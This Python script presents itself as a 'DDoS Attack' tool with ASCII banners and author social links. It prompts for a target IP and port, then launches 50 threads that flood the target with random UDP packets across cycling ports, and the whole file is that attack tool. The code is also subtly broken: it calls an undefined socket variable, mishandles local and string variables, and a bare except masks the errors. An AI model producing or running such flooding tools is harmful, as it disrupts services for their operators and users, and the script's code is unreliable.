import sys
import os
import time
import socket
import random
import threading

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(1490)
#############

banner = """
 ____  ____       ____          _   _   _             _    
|  _ \|  _ \  ___/ ___|        / \ | |_| |_ __ _  ___| | __
| | | | | | |/ _ \___ \ _____ / _ \| __| __/ _` |/ __| |/ /
| |_| | |_| | (_) |__) |_____/ ___ \ |_| || (_| | (__|   < 
|____/|____/ \___/____/     /_/   \_\__|\__\__,_|\___|_|\_\
"""

attackbanner = """
    _   _   _             _      ____  _             _   _                   
   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _       
  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |      
 / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |_ _ _ 
/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, (_|_|_)                                                     |___/       
"""

os.system("clear")
print(banner)
print("")
print("[*] Author   : HA-MRX")
print("[*] YouTube  : https://www.youtube.com/c/HA-MRX")
print("[*] Github   : https://github.com/Ha3MrX")
print("[*] Facebook : https://www.facebook.com/muhamad.jabar222")
print("[*] Contributors: Paxv28 - https://github.com/Paxv28")
print("")
ip = input("Target IP: ")
port = input("Targer Port: ")

os.system("clear")
print(attackbanner)
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
def attack():
    while True:
        try:
            s.sendto(packet, (ip, int(port)))
            print("[#] Sent %s packet to %s throught Port %s" %(sent, ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1
        except:
            print("[!] No Connection, server may be down")
            break
    sys.exit(0)

for i in range(50):
    th = threading.Thread(target=attack)
    th.start()
